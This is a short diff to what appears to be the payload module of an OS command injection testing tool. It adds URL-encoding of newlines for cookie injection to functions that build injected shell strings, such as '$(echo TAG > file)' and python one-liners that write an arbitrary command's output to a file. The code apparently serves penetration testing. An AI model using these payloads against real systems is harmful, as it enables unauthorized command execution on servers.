@@ -18,6 +18,7 @@
   The "file-based" technique on Semiblind-based OS Command Injection.
   The available "file-based" payloads.
 """
+from src.utils import settings
 
 # ----------------------------------------------------------
 # File-based decision payload (check if host is vulnerable). 
@@ -27,7 +28,7 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
   payload = (separator + " " +
             "$(echo " + TAG + "" + " > " + OUTPUT_TEXTFILE + ")"
             ) 
-  
+
   return payload
 
 """
@@ -38,6 +39,9 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
   payload = (separator + " " + 
             "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('"+ TAG + "')\nf.close()\n\")"
              ) 
+
+  if settings.COOKIE_INJECTION == True:
+    payload = payload.replace("\n","%0a")
 
   return payload
 
@@ -60,5 +64,6 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
   payload = (separator + 
             "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
             )
-  
+  if settings.COOKIE_INJECTION == True:
+    payload = payload.replace("\n","%0a")
   return payload
